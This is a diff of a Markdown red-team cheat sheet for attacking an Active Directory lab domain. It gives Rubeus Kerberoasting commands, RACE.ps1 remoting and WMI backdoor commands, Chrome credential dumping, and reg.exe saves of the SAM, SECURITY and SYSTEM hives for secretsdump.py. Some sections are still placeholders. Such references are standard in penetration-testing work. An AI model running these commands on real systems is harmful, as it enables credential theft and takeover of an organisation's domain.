@@ -35,13 +35,13 @@ Collection methods reference: https://bloodhound.readthedocs.io/en/latest/data-c
 ## Local Privilege Escalation
 PowerUp
 
--------------------------------------------------------------
+------------------------------------------------------------------------------------------
 ## Lateral Movement
 Invoke-TheHash
 
 Enable Powershell Remoting manually
 ```
-powershell 
+# powershell 
 ```
 
 [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
@@ -50,7 +50,7 @@ powershell
 # powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com
 # powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com
 ```
--------------------------------------------------------------
+------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
 ### GPP Password
 [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
@@ -83,20 +83,23 @@ Kerberoast specific user
 
 Rubeus kerberoasting
 ```
-Kerberoast all users:
+Kerberoast all users
 # execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com
 
-Kerberoast specific user:
+Kerberoast specific user
 # execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
 ```
 
--------------------------------------------------
+------------------------------------------------------------------------------------------
 ## Exploitation
 
 ### Chrome Session Stealing
-SharpDPAPI and SharpChrome
+SharpDPAPI and SharpChrome (require DA privileges)
 
----
+Dumping Chrome login passwords
+- SharpChrome
+
+------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
 ### Dumping LSASS locally
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
@@ -114,19 +117,24 @@ Extracting hashes offline from LSASS using Mimikatz
 ```
 ### SAM dump
 ```
-# reg.exe save HKLM\sam sam.save
-# reg.exe save HKLM\security security.save
-# reg.exe save HKLM\system system.save
+# shell reg.exe save HKLM\sam sam.save
+# shell reg.exe save HKLM\security security.save
+# shell reg.exe save HKLM\system system.save
 
 Download files to dump SAM hahses offline using Secretsdump.py
 # python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 ### NTDS.dit dump
-[Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit hashes remotely
+[Secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump NTDS.dit remotely
+```
+fill
+```
+NTDSutil.exe to dump NTDS.dit locally on a Domain Controller
+```
+fill
+```
 
-NTDSutil to dump NTDS.dit locally on a Domain Controller
-
----
+------------------------------------------------------------------------------------------
 # References
 [Cobalt Strike commands cheat-sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
 
